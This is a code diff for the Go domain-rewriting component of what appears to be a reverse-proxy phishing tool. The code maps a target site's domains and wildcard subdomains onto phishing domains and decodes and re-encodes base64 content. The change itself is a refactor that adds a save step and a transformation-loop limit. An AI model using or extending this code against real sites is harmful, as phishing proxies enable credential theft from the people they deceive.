@@ -20,26 +20,9 @@ const (
 	// Base64Padding is the padding to use within base64 operations
 	Base64Padding = '='
 
-	// Wildcard key
+	// WildcardPrefix is the prefix used to identify wildcard domains
 	WildcardPrefix = "wld"
 )
-
-// Replacer structure used to populate the transformation rules
-type Replacer struct {
-	Phishing                      string
-	Target                        string
-	ExternalOrigin                []string
-	ExternalOriginPrefix          string
-	OriginsMapping                map[string]string // The origin map who maps between external origins and internal origins
-	WildcardMapping               map[string]string
-	CustomResponseTransformations [][]string
-	ForwardReplacements           []string
-	BackwardReplacements          []string
-	LastForwardReplacements       []string
-	LastBackwardReplacements      []string
-
-	WildcardDomain string
-}
 
 // Base64 identifies if the transformation should consider base-64 data and the related padding rules
 type Base64 struct {
@@ -60,9 +43,9 @@ type Base64 struct {
 // apply the transformation and re-encode (hello ReCaptcha)
 func (r *Replacer) Transform(input string, forward bool, b64 Base64) (result string) {
 
-	original := input
-	if strings.TrimSpace(input) == "" {
-		return input
+	source := strings.TrimSpace(input)
+	if source == "" {
+		return source
 	}
 
 	var replacements []string
@@ -76,29 +59,25 @@ func (r *Replacer) Transform(input string, forward bool, b64 Base64) (result str
 	}
 
 	// Handling of base64 encoded data which should be decoded before transformation
-	input, base64Found, padding := transformBase64(input, b64, true, Base64Padding)
+	source, base64Found, padding := transformBase64(source, b64, true, Base64Padding)
 
 	// Replace transformation
-	replacer := strings.NewReplacer(replacements...)
-	result = replacer.Replace(input)
-
+	result = strings.NewReplacer(replacements...).Replace(source)
 	// do last replacements
-	replacer = strings.NewReplacer(lastReplacements...)
-	result = replacer.Replace(result)
+	result = strings.NewReplacer(lastReplacements...).Replace(result)
 
 	// Re-encode if base64 encoded data was found
 	if base64Found {
 		result, _, _ = transformBase64(result, b64, false, padding)
 	}
 
-	if original != result {
-
+	// If the result is the same as the input, we don't need to do anything else
+	if source != result {
 		// Find wildcard matching
 		if Wildcards {
 			var rep []string
 
 			wldPrefix := fmt.Sprintf("%s%s", r.ExternalOriginPrefix, WildcardPrefix)
-
 			if strings.Contains(result, "."+wldPrefix) {
 
 				// URL encoding handling
@@ -134,7 +113,7 @@ func (r *Replacer) Transform(input string, forward bool, b64 Base64) (result str
 					// Patch the wildcard
 					element = strings.ReplaceAll(element, "."+wldPrefix, "-"+wldPrefix)
 					rep = append(rep, element)
-					// log.Info("[*] New wildcard %s", tui.Bold(tui.Red(element)))
+					log.Info("[*] New wildcard %s", tui.Bold(tui.Red(element)))
 				}
 
 				if urlEncoded {
@@ -159,10 +138,20 @@ func (r *Replacer) Transform(input string, forward bool, b64 Base64) (result str
 						return
 					}
 
+					if err = r.Save(); err != nil {
+						log.Error("Error saving replacer: %s", err)
+					}
+
 					r.MakeReplacements()
 					log.Debug("We need another transformation loop, because of this new domains: %s",
 						tui.Green(fmt.Sprintf("%v", rep)))
-					return r.Transform(input, forward, b64)
+					r.loopCount++
+					if r.loopCount > 10 {
+						log.Error("Too many transformation loops, aborting.")
+						return
+					}
+
+					return r.Transform(source, forward, b64)
 				}
 			}
 		}
@@ -201,7 +190,7 @@ func (r *Replacer) transformUrl(URL string, base64 Base64) (result string, err e
 	result = r.Transform(URL, true, base64)
 
 	// After initial transformation round.
-	// If the input is a valid URL proceed by tranforming also the query string
+	// If the input is a valid URL proceed by transforming also the query string
 
 	hURL, err := url.Parse(result)
 	if err != nil || hURL.Scheme == "" || hURL.Host == "" {
@@ -262,12 +251,14 @@ func (r *Replacer) MakeReplacements() {
 	//
 	// Requests
 	//
+	origins := r.GetOrigins()
+
 	r.ForwardReplacements = []string{}
 	r.ForwardReplacements = append(r.ForwardReplacements, []string{r.Phishing, r.Target}...)
 
-	log.Debug("[Forward | origins]: %d", len(r.OriginsMapping))
+	log.Debug("[Forward | Origins]: %d", len(origins))
 	count := len(r.ForwardReplacements)
-	for extOrigin, subMapping := range r.OriginsMapping { // changes resource-1.phishing.
+	for extOrigin, subMapping := range origins { // changes resource-1.phishing.
 
 		if strings.HasPrefix(subMapping, WildcardPrefix) {
 			// Ignoring wildcard at this stage
@@ -302,7 +293,7 @@ func (r *Replacer) MakeReplacements() {
 	r.BackwardReplacements = append(r.BackwardReplacements, []string{r.Target, r.Phishing}...)
 
 	count = 0
-	for include, subMapping := range r.OriginsMapping {
+	for include, subMapping := range origins {
 
 		if strings.HasPrefix(subMapping, WildcardPrefix) {
 			// Ignoring wildcard at this stage
@@ -345,16 +336,11 @@ func (r *Replacer) MakeReplacements() {
 }
 
 func (r *Replacer) DomainMapping() (err error) {
-
-	// d := strings.Split(r.Target, ".")
-	//baseDom := fmt.Sprintf("%s.%s", d[len(d)-2], d[len(d)-1])
-
-	// Changing baseDom to be the actual Target domain.
 	baseDom := r.Target
 	log.Debug("Proxy destination: %s", tui.Bold(tui.Green("*."+baseDom)))
 
 	r.ExternalOrigin = ArmorDomain(r.ExternalOrigin)
-	r.OriginsMapping = make(map[string]string)
+	origins := make(map[string]string)
 	r.WildcardMapping = make(map[string]string)
 
 	count, wildcards := 0, 0
@@ -364,7 +350,7 @@ func (r *Replacer) DomainMapping() (err error) {
 
 			// We don't map 1-level subdomains ..
 			if strings.Count(trim, ".") < 2 {
-				log.Debug("Ignore: %s [%s]", domain, trim)
+				log.Warning("Ignore: %s [%s]", domain, trim)
 				continue
 			}
 		}
@@ -388,7 +374,7 @@ func (r *Replacer) DomainMapping() (err error) {
 			count++
 			// Extra domains or nested subdomains
 			o := fmt.Sprintf("%s%d", r.ExternalOriginPrefix, count)
-			r.OriginsMapping[domain] = o
+			origins[domain] = o
 			//log.Info("Including [%s]=%s", domain, o)
 			log.Debug(fmt.Sprintf("Including [%s]=%s", domain, o))
 		}
@@ -399,7 +385,8 @@ func (r *Replacer) DomainMapping() (err error) {
 		Wildcards = true
 	}
 
-	log.Debug("Processed %d domains to transform, %d are wildcards", count, wildcards)
+	r.SetOrigins(origins)
 
+	log.Debug("Processed %d domains to transform, %d are wildcards", count, wildcards)
 	return
 }
